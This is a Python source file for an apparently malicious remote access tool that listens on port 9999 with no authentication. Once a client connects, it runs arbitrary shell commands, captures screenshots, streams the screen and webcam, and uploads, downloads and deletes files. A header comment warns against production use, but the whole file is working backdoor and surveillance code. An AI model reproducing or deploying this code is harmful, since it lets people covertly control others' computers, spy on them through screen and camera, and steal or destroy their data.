#copyright © 2019-2024 manoharkakumani
# WARNING: This script allows remote execution of commands and access to system resources.
# It should be used with caution and never in a production environment without proper security measures.

import socket
import os
import subprocess
import shutil
import pickle
import struct
import pyautogui
import cv2
import numpy
from PIL import ImageGrab

# Global variables for socket connection
host = ''
port = 9999
server_socket = None

def create_server_socket():
    """Create a server socket to listen for incoming connections."""
    global server_socket
    try:
        server_socket = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

def bind_and_listen():
    """Bind the socket to the host and port, and start listening for connections."""
    try:
        global host, port, server_socket
        server_socket.bind((host, port))
        server_socket.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg))
        bind_and_listen()  # Retry binding

def execute_shell_command(command, connection):
    """Execute shell commands received from the client."""
    try:
        if command.startswith('cd'):
            os.chdir(command[3:])
        if len(command) > 0:
            cmd_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_bytes = cmd_process.stdout.read() + cmd_process.stderr.read()
            output_str = str(output_bytes, "utf-8")
            current_working_directory = os.getcwd() + "> "
            connection.send(str.encode(output_str + current_working_directory))
    except Exception as e:
        connection.send(str(e).encode("utf-8"))

def take_screenshot(connection):
    """Capture the current screen and send it to the client."""
    screenshot = pyautogui.screenshot()
    screenshot_file = 'screenshot.png'
    screenshot.save(screenshot_file)
    send_file(screenshot_file, connection)
    os.remove(screenshot_file)

def stream_screen(connection):
    """Stream the screen to the client."""
    while True:
        command = connection.recv(4096).decode('utf-8')
        if command == "stream":
            frame = numpy.array(ImageGrab.grab())
            result, frame = cv2.imencode('.jpg', frame)
            data = pickle.dumps(frame, 0)
            size = len(data)
            connection.sendall(struct.pack(">L", size) + data)
        else:
            break

def access_camera(connection):
    """Access the camera and send the feed to the client."""
    cam = cv2.VideoCapture(0)
    if cam.isOpened():
        while True:
            command = connection.recv(4096).decode('utf-8')
            if command == "cam":
                ret, frame = cam.read()
                result, frame = cv2.imencode('.jpg', frame)
                data = pickle.dumps(frame, 0)
                connection.sendall(struct.pack(">L", len(data)) + data)
            else:
                cam.release()
                break
    else:
        connection.send('No camera found'.encode("utf-8"))

def list_files(connection):
    """Send a list of files in the current directory to the client."""
    file_list = pickle.dumps(os.listdir())
    connection.send(file_list)

def change_directory(connection):
    """Change the current working directory based on client input."""
    try:
        connection.send((os.getcwd()).encode("utf-8"))
        confirmation = connection.recv(1024).decode("utf-8")
        if confirmation == 'Y':
            new_directory = connection.recv(1024).decode("utf-8")
            os.chdir(new_directory)
            connection.send((os.getcwd()).encode("utf-8"))
    except Exception as e:
        connection.send(str(e).encode("utf-8"))

def download_file_from_client(filename, connection):
    """Receive a file from the client and save it locally."""
    data = connection.recv(1024).decode("utf-8")
    if data.startswith('EXISTS'):
        filesize = int(data[6:])
        connection.send("OK".encode("utf-8"))
        with open(filename, 'wb') as f:
            data = connection.recv(1024)
            total_received = len(data)
            f.write(data)
            while total_received < filesize:
                data = connection.recv(1024)
                total_received += len(data)
                f.write(data)

def send_file(filename, connection):
    """Send a file to the client."""
    if os.path.isfile(filename):
        connection.send(str.encode("EXISTS " + str(os.path.getsize(filename))))
        filesize = int(os.path.getsize(filename))
        user_response = connection.recv(1024).decode("utf-8")
        if user_response[:2] == 'OK':
            with open(filename, 'rb') as f:
                bytes_to_send = f.read(1024)
                connection.send(bytes_to_send)
                total_sent = len(bytes_to_send)
                while total_sent < filesize:
                    bytes_to_send = f.read(1024)
                    total_sent += len(bytes_to_send)
                    connection.send(bytes_to_send)
    else:
        connection.send("ERROR".encode("utf-8"))

def delete_file_or_directory(name, connection):
    """Delete a file or directory based on client request."""
    try:
        if os.path.isfile(name):
            os.remove(name)
        elif os.path.isdir(name):
            shutil.rmtree(name)
        connection.send("Success".encode("utf-8"))
    except Exception as e:
        connection.send(str(e).encode("utf-8"))

def main_loop(connection):
    """Main loop to handle commands from the client."""
    while True:
        data = connection.recv(1024).decode("utf-8").split('~')
        command = data[0]
        arg = data[1] if len(data) > 1 else None

        if command == 'cmd':
            execute_shell_command(arg, connection)
        elif command == 'fdown':
            send_file(arg, connection)
        elif command == 'fup':
            download_file_from_client(arg, connection)
        elif command == 'cdir':
            change_directory(connection)
        elif command == 'flist':
            list_files(connection)
        elif command == 'fdel':
            delete_file_or_directory(arg, connection)
        elif command == 'sshot':
            take_screenshot(connection)
        elif command == 'cam':
            access_camera(connection)
        elif command == 'stream':
            stream_screen(connection)
        elif command == 'cwd':
            connection.send((os.getcwd()).encode("utf-8"))
        elif command in ['back', 'exit']:
            connection.close()
            return command
        else:
            connection.send("Invalid command.".encode('utf-8'))

def accept_connections():
    """Accept incoming connections and handle them."""
    conn, address = server_socket.accept()
    return main_loop(conn)

# Initialize and run the server
create_server_socket()
bind_and_listen()
while True:
    if accept_connections() == "back":
        continue
    else:
        break
